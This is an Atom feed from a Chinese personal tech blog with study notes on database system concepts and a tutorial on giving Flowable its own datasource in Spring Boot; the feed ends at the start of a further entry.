<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>可弟的杂货摊</title>
  
  <subtitle>工作、学习、生活</subtitle>
  <link href="http://blog.kekwy.com/atom.xml" rel="self"/>
  
  <link href="http://blog.kekwy.com/"/>
  <updated>2024-01-01T06:32:23.618Z</updated>
  <id>http://blog.kekwy.com/</id>
  
  <author>
    <name>可弟WZ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Butterfly 主题自定义字体无效</title>
    <link href="http://blog.kekwy.com/solution1/"/>
    <id>http://blog.kekwy.com/solution1/</id>
    <published>2024-01-01T06:29:10.000Z</published>
    <updated>2024-01-01T06:32:23.618Z</updated>
    
    <content type="html"><![CDATA[<p>待续</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;待续&lt;/p&gt;
</summary>
      
    
    
    
    <category term="问题记录" scheme="http://blog.kekwy.com/categories/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Butterfly" scheme="http://blog.kekwy.com/tags/Butterfly/"/>
    
    <category term="Hexo" scheme="http://blog.kekwy.com/tags/Hexo/"/>
    
    <category term="css" scheme="http://blog.kekwy.com/tags/css/"/>
    
    <category term="Aplayer" scheme="http://blog.kekwy.com/tags/Aplayer/"/>
    
    <category term="字体" scheme="http://blog.kekwy.com/tags/%E5%AD%97%E4%BD%93/"/>
    
  </entry>
  
  <entry>
    <title>【数据库】数据库系统概念 关系语言</title>
    <link href="http://blog.kekwy.com/database-note2/"/>
    <id>http://blog.kekwy.com/database-note2/</id>
    <published>2024-01-01T04:18:45.000Z</published>
    <updated>2024-01-01T06:32:28.169Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第-2-章-关系模型介绍"><a href="#第-2-章-关系模型介绍" class="headerlink" title="第 2 章 关系模型介绍"></a>第 2 章 关系模型介绍</h2><p>待续</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;第-2-章-关系模型介绍&quot;&gt;&lt;a href=&quot;#第-2-章-关系模型介绍&quot; class=&quot;headerlink&quot; title=&quot;第 2 章 关系模型介绍&quot;&gt;&lt;/a&gt;第 2 章 关系模型介绍&lt;/h2&gt;&lt;p&gt;待续&lt;/p&gt;
</summary>
      
    
    
    
    <category term="数据库系统概念" scheme="http://blog.kekwy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/"/>
    
    
    <category term="数据库" scheme="http://blog.kekwy.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="database" scheme="http://blog.kekwy.com/tags/database/"/>
    
  </entry>
  
  <entry>
    <title>【数据库】数据库系统概念 引言</title>
    <link href="http://blog.kekwy.com/database-note1/"/>
    <id>http://blog.kekwy.com/database-note1/</id>
    <published>2023-12-28T09:28:05.000Z</published>
    <updated>2024-01-01T03:38:05.644Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第-1-章-引言"><a href="#第-1-章-引言" class="headerlink" title="第 1 章 引言"></a>第 1 章 引言</h2><p>数据库管理系统（DBMS）：由一个互相关联的数据的集合和一组用以访问这些数据的程序组成。DBMS 的主要目标是要提供一种可以方便、高效地存取数据库信息的途径。</p><h3 id="1-1-数据库的应用"><a href="#1-1-数据库的应用" class="headerlink" title="1.1 数据库的应用"></a>1.1 数据库的应用</h3><ul><li><strong>企业信息</strong>：销售、会计、人力资源、生产制造、联机零售；</li><li><strong>银行和金融</strong>：银行业、信用卡交易、金融业；</li><li><strong>大学</strong>：存储学生信息、课程注册和成绩；</li><li><strong>航空业</strong>：存储订票和航班信息；</li><li><strong>电信业</strong>：存储通话记录。</li></ul><h3 id="1-2-数据库系统的目标"><a href="#1-2-数据库系统的目标" class="headerlink" title="1.2 数据库系统的目标"></a>1.2 数据库系统的目标</h3><p>文件处理系统中存储组织信息的主要弊端包括：</p><ul><li><strong>数据的冗余和不一致</strong>：不同文件可能有不同结构，不同程序可能由不同语言写成，相同的信息可能在多个地方重复存储；同一数据的不同副本不一致。</li><li><strong>数据访问困难</strong>：不支持以一种方便而高效的方式去获取所有数据。</li><li><strong>数据孤立</strong>：数据分散在不同文件中，这些文件又可能具有不同的格式。</li><li><strong>完整性问题</strong>：对数据的一致性约束很难实现。</li><li><strong>原子性问题</strong>：一次事务中对数据的所有操作要么都发生，要么根本不发生。</li><li><strong>并发访问异常</strong>：多线程&#x2F;进程同步问题。</li><li><strong>安全性问题</strong>：并非数据库系统的所有用户都可以访问所有数据。</li></ul><h3 id="1-3-数据视图"><a href="#1-3-数据视图" class="headerlink" title="1.3 数据视图"></a>1.3 数据视图</h3><p>数据库系统要为用户提供数据的抽象视图，即系统隐藏关于数据存储和维护的某些细节。</p><h4 id="1-3-1-数据抽象"><a href="#1-3-1-数据抽象" class="headerlink" title="1.3.1 数据抽象"></a>1.3.1 数据抽象</h4><img src="https://assets.kekwy.com/images/%E6%96%B0%E6%96%87%E6%A1%A3%202023-12-31%2013.32.jpg" alt="数据抽象的三个层次" width=350 /><ul><li><p><strong>物理层</strong>：最底层次的抽象，描述数据实际上是怎样存储的，详细描述复杂的底层数据结构；</p></li><li><p><strong>逻辑层</strong>：描述数据库中存储什么数据及这些数据间存在什么关系；</p><blockquote><p><strong>物理数据独立性</strong>：逻辑层的结构实现设计复杂的物理层结构，但逻辑层的用户不必知道这样的复杂性。</p></blockquote></li><li><p><strong>视图层</strong>：最高层次的抽象，只描述整个数据库的某个部分。</p></li></ul><h4 id="1-3-2-实例和模式"><a href="#1-3-2-实例和模式" class="headerlink" title="1.3.2 实例和模式"></a>1.3.2 实例和模式</h4><p><strong>实例</strong> (instance)：特定时刻存储在数据库中的信息的集合称作数据库的一个实例；</p><p><strong>模式</strong> (schema)：数据库的总体设计称作数据库模式。</p><p><strong>模式</strong>与<strong>实例</strong>的关系可以类比面向对象程序设计中<strong>类</strong>与<strong>对象</strong>的关系。</p><p>根据不同的抽象层次，数据库系统可以分为几种不同的模式：物理模式、逻辑模式、子模式。</p><h4 id="1-3-3-数据模型"><a href="#1-3-3-数据模型" class="headerlink" title="1.3.3 数据模型"></a>1.3.3 数据模型</h4><p><strong>数据模型</strong>：一个描述数据、数据联系、数据语义以及一致性约束的概念工具的集合。</p><ul><li><strong>关系模型</strong>：用表的集合表示数据和数据间的联系。每个表包含某种特定类型的记录。每个记录类型定义了固定数目的字段（或属性）。表的列对应于记录类型的属性。</li><li><strong>实体 - 联系模型</strong>：现实世界由一组称作实体的基本对象以及其之间的联系构成。实体是现实世界中可区别于其他对象的一件“事情”或一个“物体”。</li><li><strong>基于对象的数据模型</strong>：可看作 E - R 模型增加了封装、方法和对象标识等概念后的扩展。</li><li><strong>半结构化数据模型</strong>：允许那些相同类型的数据项含有不同的属性集的数据定义。</li></ul><h3 id="1-4-数据库语言"><a href="#1-4-数据库语言" class="headerlink" title="1.4 数据库语言"></a>1.4 数据库语言</h3><p><strong>数据定义语言</strong>：定义数据库模式；</p><p><strong>数据操纵语言</strong>：表达数据库的查询和更新。</p><p>两者不是两种分离的语言，其构成了单一的数据库语言的不同部分。</p><h4 id="1-4-1-数据操纵语言"><a href="#1-4-1-数据操纵语言" class="headerlink" title="1.4.1 数据操纵语言"></a>1.4.1 数据操纵语言</h4><p><strong>数据操纵语言</strong> (DML)：使得用户可以访问或操纵那些按照某种适当的数据模型组织起来的数据。</p><p>有以下访问类型：检索、插入、删除、修改。（CRUD）</p><p>两类基本的数据操纵语言：</p><ul><li><strong>过程化 DML</strong>：要求用户指定需要什么数据以及如何获得这些数据；</li><li><strong>声明式 DML</strong>：只要求用户指定需要什么数据，而不指明如何获得这些数据。</li></ul><h4 id="1-4-2-数据定义语言"><a href="#1-4-2-数据定义语言" class="headerlink" title="1.4.2 数据定义语言"></a>1.4.2 数据定义语言</h4><p><strong>数据定义语言</strong> (DDL)：说明数据库模式，定义数据的其他特征。</p><p><strong>数据存储和定义语言</strong>：一种特殊的 DDL，用于说明数据库系统所使用的存储结构和访问方式。（实现细节）</p><p>可以以最小代价测试的完整性约束：</p><ul><li><strong>域约束</strong>： 最基本形式，约束属性可以取的值。</li><li><strong>参照完整性</strong>：一个关系中给定属性集上的取值也在另一关系的某一属性集的取值中出现。</li><li><strong>断言</strong>：数据库需要时刻满足的某一条件，上述两种约束是断言的特殊形式。</li><li><strong>授权</strong>：读权限、插入权限、更新权限、删除权限。</li></ul><p>DDL 的输出放在数据字典中，数据字段包含了元数据，元数据是关于数据的数据。</p><h3 id="1-5-关系数据库"><a href="#1-5-关系数据库" class="headerlink" title="1.5 关系数据库"></a>1.5 关系数据库</h3><p>关系型数据库基于关系模型，使用一系列表来表达数据以及这些数据之间的联系。</p><h4 id="1-5-1-表"><a href="#1-5-1-表" class="headerlink" title="1.5.1 表"></a>1.5.1 表</h4><p>每个表有多个列，每个列有唯一的名字。</p><p><img src="https://assets.kekwy.com/images/image-20231231144429644.png" alt="image-20231231144429644"></p><h4 id="1-5-2-数据操纵语言"><a href="#1-5-2-数据操纵语言" class="headerlink" title="1.5.2 数据操纵语言"></a>1.5.2 数据操纵语言</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> instructor.name</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">where</span> instructor,dept_name<span class="operator">=</span><span class="string">&#x27;History&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> instructor.ID, department.dept_name</span><br><span class="line"><span class="keyword">from</span> instructor, department</span><br><span class="line"><span class="keyword">where</span> instructor.dept_name <span class="operator">=</span> department.dept_name <span class="keyword">and</span></span><br><span class="line">department.budget <span class="operator">&gt;</span> <span class="number">95000</span>;</span><br></pre></td></tr></table></figure><h4 id="1-5-3-数据定义语言"><a href="#1-5-3-数据定义语言" class="headerlink" title="1.5.3 数据定义语言"></a>1.5.3 数据定义语言</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> department</span><br><span class="line">    (dept_name      <span class="type">char</span>(<span class="number">20</span>),</span><br><span class="line">     building       <span class="type">char</span>(<span class="number">15</span>)</span><br><span class="line">     budget         <span class="type">numeric</span>(<span class="number">12</span>, <span class="number">2</span>));</span><br></pre></td></tr></table></figure><h4 id="1-5-4-来自应用程序的数据库访问"><a href="#1-5-4-来自应用程序的数据库访问" class="headerlink" title="1.5.4 来自应用程序的数据库访问"></a>1.5.4 来自应用程序的数据库访问</h4><p>SQL 不支持的计算需要基于宿主语言来实现。</p><p>为了访问数据库 DML 语句需要由宿主语言来执行：</p><ul><li>提供应用程序接口：ODBC、JDBC。</li><li>扩展宿主语言语法：通过 DML 预编译器将 DML 语句转变成宿主语言中的过程调用。</li></ul><h3 id="1-6-数据库设计"><a href="#1-6-数据库设计" class="headerlink" title="1.6 数据库设计"></a>1.6 数据库设计</h3><p>数据库设计的主要内容是数据库模式的设计。</p><h4 id="1-6-1-设计过程"><a href="#1-6-1-设计过程" class="headerlink" title="1.6.1 设计过程"></a>1.6.1 设计过程</h4><ol><li><p>刻画用户的数据需求，制定用户需求的规格文档；</p></li><li><p>概念设计，选择一个数据模型，将需求转换成一个数据库的概念模式；</p><ul><li><p>决定包含哪些属性：商业决策；</p></li><li><p>决定如何将这些属性组织到多个表中：</p><p>1）实体 - 联系模型；</p><p>2）规范化。</p></li><li><p>功能需求说明，描述用户在数据之上的各种操作。</p></li></ul></li><li><p>逻辑设计阶段：将概念模式映射到要使用的数据库系统的实现数据模型上；</p></li><li><p>物理设计阶段：根据得到的数据库模式指定数据库的物理特性。</p></li></ol><h4 id="1-6-2-实体-联系模型"><a href="#1-6-2-实体-联系模型" class="headerlink" title="1.6.2 实体 - 联系模型"></a>1.6.2 实体 - 联系模型</h4><p>E - R 数据模型使用一组称作实体的基本对象，以及这些对象间的联系。</p><p>数据库中实体通过属性集合来描述；</p><p>联系是几个实体之间的关联，同一类型的所有实体的集合称作实体集，同一类型的所有联系的集合称作联系集。</p><p>使用 UML 绘制 E - R 图：</p><ul><li>实体集用矩形框表示，实体名在头部，属性名列在下面。</li><li>联系集用连接一对相关的实体集的菱形表示，联系名放在菱形内部。</li></ul><img src="https://assets.kekwy.com/images/image-20231231154219714.png" alt="E - R图" width=500 /><p><strong>映射基数</strong>：表示通过某个联系集能与一实体进行关联的实体数目。</p><h4 id="1-6-3-规范化"><a href="#1-6-3-规范化" class="headerlink" title="1.6.3 规范化"></a>1.6.3 规范化</h4><p>目标：生成一个关系模式集合，使我们存储信息时没有不必要的冗余，同时又能很轻易地检索数据。最常用的方式是函数依赖。</p><p>一个不好的设计可能会导致的不良特性：</p><ul><li>信息重复；</li><li>缺乏表达某些信息的能力。</li></ul><h3 id="1-7-数据存储和查询"><a href="#1-7-数据存储和查询" class="headerlink" title="1.7 数据存储和查询"></a>1.7 数据存储和查询</h3><p>数据库系统的功能部件大致可分为存储管理器和查询处理器。</p><h4 id="1-7-1-存储管理器"><a href="#1-7-1-存储管理器" class="headerlink" title="1.7.1 存储管理器"></a>1.7.1 存储管理器</h4><p><strong>存储管理器</strong>：负责与文件管理器进行交互，将各种 DML 语句翻译为底层文件系统命令。负责数据库中数据的存储、检索和更新。</p><p><strong>存储管理部件</strong>：</p><ul><li><strong>权限及完整性管理器</strong>：检查约束和权限。</li><li><strong>事务管理器</strong>：保证一致性与并发访问。</li><li><strong>文件管理器</strong>：管理磁盘空间分配与存储信息的数据结构。</li><li><strong>缓冲区管理器</strong>：在内存与磁盘间进行缓存调度。</li></ul><p>存储管理器实现的<strong>数据结构</strong>：</p><ul><li><strong>数据文件</strong>：存储数据。</li><li><strong>数据字典</strong>：存储元数据，尤其是数据库模式。</li><li><strong>索引</strong>：提供对数据项的快速访问。</li></ul><h4 id="1-7-2-查询处理器"><a href="#1-7-2-查询处理器" class="headerlink" title="1.7.2 查询处理器"></a>1.7.2 查询处理器</h4><p>查询处理组件包括：</p><ul><li><strong>DDL 解释器</strong>：解释 DDL 语句并将这些定义记录在数据字典中。</li><li><strong>DML 编译器</strong>：将查询语言中的一系列低级指令。</li><li><strong>查询执行引擎</strong>：执行由 DML 编译器产生的低级指令。</li></ul><h3 id="1-8-事务管理"><a href="#1-8-事务管理" class="headerlink" title="1.8 事务管理"></a>1.8 事务管理</h3><blockquote><p>原子性：一个逻辑单元中的所有操作要么都发生，要么都不发生。</p><p>持久性：一个逻辑单元执行结束后，即使系统故障，数据库也要保持操作完成后的状态。</p></blockquote><p><strong>事务</strong>：数据库应用中完成单一逻辑功能的操作集合。事务启动和成功结束时数据库都是一致的。</p><p><strong>事务管理器</strong>：</p><ul><li><strong>恢复管理器</strong>：事务执行失败时，负责进行故障恢复，即检测系统故障并将数据库恢复到故障发生以前的状态。</li><li><strong>并发管理器</strong>：控制并发事务间的相互影响，保证数据库一致性。</li></ul><h3 id="1-9-数据库体系结构"><a href="#1-9-数据库体系结构" class="headerlink" title="1.9 数据库体系结构"></a>1.9 数据库体系结构</h3><img src="https://assets.kekwy.com/images/image-20231231163459860.png" alt="系统体系结构" width=550 /><img src="https://assets.kekwy.com/images/image-20231231163519882.png" alt="两层和三层体系结构" width=500 /><h3 id="1-10-数据库用户和管理员"><a href="#1-10-数据库用户和管理员" class="headerlink" title="1.10 数据库用户和管理员"></a>1.10 数据库用户和管理员</h3><h4 id="1-10-1-数据库用户和用户界面"><a href="#1-10-1-数据库用户和用户界面" class="headerlink" title="1.10.1 数据库用户和用户界面"></a>1.10.1 数据库用户和用户界面</h4><ul><li><strong>初学者用户</strong>：缺少经验，使用已有的用户界面与系统交互。</li><li><strong>应用程序员</strong>：计算机专业人员，可以借助工具开发应用界面。</li><li><strong>老练用户</strong>：使用数据库查询语言或数据分析软件与系统交互。</li></ul><h4 id="1-10-2-数据库管理员"><a href="#1-10-2-数据库管理员" class="headerlink" title="1.10.2 数据库管理员"></a>1.10.2 数据库管理员</h4><p><strong>数据库管理员</strong> (DBA)：对系统进行集中控制的人。</p><p>DBA 的作用包括：</p><ul><li>模式定义；</li><li>存储结构及存取方法定义；</li><li>模式及物理组织的修改；</li><li>数据访问授权；</li><li>日常维护。</li></ul>]]></content>
    
    
    <summary type="html">数据库系统设计用来存储大量的信息。数据的管理既包括信息存储结构的定义，也包括信息处理机制的提供。另外数据库系统还必须提供所存储信息的安全性，以处理系统崩溃或者非授权访问企图。如果数据在多个用户之间共享，系统还必须避免可能的异常结果。</summary>
    
    
    
    <category term="数据库系统概念" scheme="http://blog.kekwy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/"/>
    
    
    <category term="数据库" scheme="http://blog.kekwy.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="database" scheme="http://blog.kekwy.com/tags/database/"/>
    
  </entry>
  
  <entry>
    <title>Spring Boot 集成 Flowable 并自定义数据源</title>
    <link href="http://blog.kekwy.com/flowable-datasource/"/>
    <id>http://blog.kekwy.com/flowable-datasource/</id>
    <published>2023-04-26T01:17:33.000Z</published>
    <updated>2023-12-29T01:59:54.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring-Boot-集成-Flowable-并自定义数据源"><a href="#Spring-Boot-集成-Flowable-并自定义数据源" class="headerlink" title="Spring Boot 集成 Flowable 并自定义数据源"></a>Spring Boot 集成 Flowable 并自定义数据源</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在使用 <code>flowable-spring-boot-starter</code> 进行 spring boot 集成 flowable 时，flowable 会使用配置文件中  <code>spring.datasource</code> 前缀下设置的数据源：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">datasource1</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">xxxx</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">xxxx</span></span><br></pre></td></tr></table></figure><p>而项目中的其他数据库工具，如 mybatis 等，同样也会使用此数据源。由于 flowable 相关的表结构过多，该数据源我们只希望保存与项目业务相关的表结构，故尝试使 flowable 使用其他数据源（非默认，自定义）。</p><p>Spring Boot 版本：3.0.5</p><p>Flowable 版本：7.0.0.M1</p><p>相关依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- MySQL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.flowable/flowable-spring-boot-starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.flowable<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flowable-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.0.M1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>首先在配置文件中添加我们自定义的数据源，前缀任意，不冲突即可：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flowable:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">datasource2</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">xxxx</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">xxxx</span></span><br></pre></td></tr></table></figure><p>定义 <code>org.flowable.common.engine.impl.EngineConfigurator</code> 接口的一个实现类，读取配置文件信息并在 <code>beforeInit</code> 方法中创建数据源。使用 @Component 注解生成 bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatasourceConfigurator</span> <span class="keyword">implements</span> <span class="title class_">EngineConfigurator</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;flowable.datasource.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;flowable.datasource.type&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">DataSource</span>&gt; type;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;flowable.datasource.driver-class-name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String driverClassName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;flowable.datasource.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;flowable.datasource.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeInit</span><span class="params">(AbstractEngineConfiguration engineConfiguration)</span> &#123;</span><br><span class="line">        <span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> DataSourceBuilder.create()</span><br><span class="line">                .type(type)</span><br><span class="line">                .driverClassName(driverClassName)</span><br><span class="line">                .url(url)</span><br><span class="line">                .username(username)</span><br><span class="line">                .password(password).build();</span><br><span class="line">        engineConfiguration.setDataSource(dataSource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(AbstractEngineConfiguration engineConfiguration)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPriority</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">600000</span>; <span class="comment">// 保证该优先级最高</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个配置类，实现接口 <code>org.flowable.spring.boot.EngineConfigurationConfigurer</code>。将 <code>datasourceConfigurator</code> 注入，在 <code>configure</code> 方法中将其加入 Flowable 引擎的上下文中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessEngineConfig</span> <span class="keyword">implements</span> <span class="title class_">EngineConfigurationConfigurer</span>&lt;SpringAppEngineConfiguration&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> DatasourceConfigurator datasourceConfigurator;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDatasourceConfigurator</span><span class="params">(DatasourceConfigurator datasourceConfigurator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.datasourceConfigurator = datasourceConfigurator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(SpringAppEngineConfiguration engineConfiguration)</span> &#123;</span><br><span class="line">        engineConfiguration.addConfigurator(datasourceConfigurator);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察日志发现我们自定义的配置成功地被 Flowable 引擎调用执行了：</p><p><img src="https://assets.kekwy.com/images/image-20230426115352537.png" alt="image-20230426115352537"></p><ul><li>在日志中还可以看到其他五个 Flowable 自动添加的 Configurator 和各自的优先级，优先级高的晚调用，相同配置高优先级会覆盖低优先级。故我们在定义自己的 Configurator 时需要设置一个比上述五个 Configurator 更高的优先级。</li><li>实现接口 <code>org.flowable.spring.boot.EngineConfigurationConfigurer</code> 时，注意一定要使用 SpringAppEngineConfiguration 作为泛型参数。</li></ul><p>至此，问题成功解决，欢迎大家指正。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Spring-Boot-集成-Flowable-并自定义数据源&quot;&gt;&lt;a href=&quot;#Spring-Boot-集成-Flowable-并自定义数据源&quot; class=&quot;headerlink&quot; title=&quot;Spring Boot 集成 Flowable 并自定义数据</summary>
      
    
    
    
    <category term="问题记录" scheme="http://blog.kekwy.com/categories/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Flowable" scheme="http://blog.kekwy.com/tags/Flowable/"/>
    
    <category term="data source" scheme="http://blog.kekwy.com/tags/data-source/"/>
    
    <category term="Java" scheme="http://blog.kekwy.com/tags/Java/"/>
    
    <category term="Spring Boot" scheme="http://blog.kekwy.com/tags/Spring-Boot/"/>
    
    <category term="开发" scheme="http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>服务端开发 课程总结 复习大纲</title>
    <link href="http://blog.kekwy.com/se-serverdev/"/>
    <id>http://blog.kekwy.com/se-serverdev/</id>
    <published>2023-04-09T15:56:56.000Z</published>
    <updated>2023-04-09T15:58:28.292Z</updated>
    
